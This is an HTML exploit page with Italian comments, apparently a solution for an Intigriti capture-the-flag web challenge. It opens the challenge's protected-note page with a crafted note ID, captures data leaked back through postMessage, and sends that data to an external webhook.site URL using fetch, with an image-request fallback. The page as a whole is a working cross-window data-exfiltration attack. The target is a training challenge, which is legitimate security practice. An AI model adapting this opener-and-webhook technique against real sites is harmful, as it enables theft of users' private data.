<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <h1>Opener Page</h1>
    <p>Questa pagina aprirà la challenge e attenderà un messaggio...</p>
    <p id="status">Status: In attesa...</p>
    <p>Controlla il tuo webhook: <a id="webhookLink" href="#" target="_blank">Webhook</a></p>

    <script>
        const webhookUrl = "https://webhook.site/49ab0b49-c1a8-4333-a9e0-1e6aec41edcd"; // Il tuo webhook
        document.getElementById('webhookLink').href = webhookUrl.replace('/?', '/#!/').split('/?')[0]; // Link funzionante per vedere il webhook

        // !!! METTI QUI L'ID DELLA NOTA CHE HAI CREATO NEL PASSO A !!!
        const notePayloadId = "5785583d-3890-4959-b1e0-d214d2fc3d2b"; // Esempio ID, SOSTITUISCI!

        // URL della challenge che triggera il redirect e l'observer
        const targetUrl = `https://challenge-0325.intigriti.io/view_protected_note?id=${notePayloadId}`;

        const statusElement = document.getElementById('status');

        statusElement.textContent = 'Status: Tentativo di aprire la finestra target...';
        console.log('Opening target URL:', targetUrl);

        // Apri la pagina della challenge in una nuova finestra/tab
        // Il riferimento 'victimWindow' potrebbe essere bloccato da alcuni browser
        const victimWindow = window.open(targetUrl, '_blank');

        if (victimWindow) {
            statusElement.textContent = 'Status: Finestra target aperta (o popup bloccato?). In ascolto di messaggi...';
            console.log('Window opened (or blocked). Listening for messages...');
        } else {
            statusElement.textContent = 'Status: Popup probabilmente bloccato. Impossibile procedere.';
            console.error('window.open returned null or undefined. Popup blocker?');
        }

        // Listener per i messaggi dalla finestra aperta
        window.addEventListener('message', (event) => {
            console.log('Message received:', event);

            // Verifica di sicurezza MOLTO importante: controlla l'origine del messaggio!
            // Deve provenire dal dominio della challenge.
            if (event.origin !== "https://challenge-0325.intigriti.io") {
                console.warn(`Message received from unexpected origin: ${event.origin}. Ignored.`);
                statusElement.textContent = `Status: Messaggio ricevuto da origine errata: ${event.origin}`;
                return;
            }

            const leakedData = event.data;
            console.log('Data received via postMessage:', leakedData);
            statusElement.textContent = `Status: Dati ricevuti! ${leakedData.substring(0, 50)}... Invio al webhook...`;

            // Invia i dati ricevuti al webhook
            const leakUrl = `${webhookUrl}/?postMessage_leak=${encodeURIComponent(leakedData)}`;
            console.log('Sending data to webhook:', leakUrl);

            // Usa fetch con no-cors o new Image() per inviare i dati
            fetch(leakUrl, { mode: 'no-cors' })
                .then(() => {
                    console.log('Webhook request sent (fetch).');
                    statusElement.textContent = `Status: Dati inviati al webhook! Controllalo.`;
                })
                .catch(err => {
                    console.error('Webhook fetch failed:', err);
                    // Fallback con immagine
                    new Image().src = leakUrl;
                    statusElement.textContent = `Status: Dati inviati al webhook (img fallback)! Controllalo.`;
                });

        }, false);

    </script>
</body>
</html>
